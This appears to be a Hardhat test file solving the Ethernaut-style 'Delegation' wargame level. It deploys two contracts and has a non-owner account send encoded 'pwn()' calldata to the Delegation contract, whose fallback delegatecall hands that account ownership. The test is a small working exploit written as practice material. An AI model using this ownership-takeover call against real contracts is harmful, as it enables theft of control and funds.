const { expect } = require("chai");
const { ethers } = require("hardhat");
const testUtils = require("./utils");

describe("_Contract contract", function () {		  
	let delegation, delegate;	//contracts
	let owner, addr1;			//accounts
	
	beforeEach(async function () {
		[owner, addr1, ...addrs] = await ethers.getSigners();
        
        //contract
		delegate = await testUtils.deployContract("Delegate", owner.address);
		delegation = await testUtils.deployContract("Delegation", delegate.address);
	});
	      
	describe("Initial State", function () {
		it("owners", async function () {
            expect(await (delegation.owner())).to.equal(owner.address);
            expect(await (delegate.owner())).to.equal(owner.address);
		});
    });    
	      
	describe("Delegation Call", function () {
		it("pwn", async function () {
			const callSig = new ethers.utils.Interface(["function pwn()"]).encodeFunctionData("pwn", []); 
			
			await addr1.sendTransaction({
				to: delegation.address, 
				data: callSig
			}); 
			
            expect(await (delegation.owner())).to.equal(addr1.address);
		});
    });   
});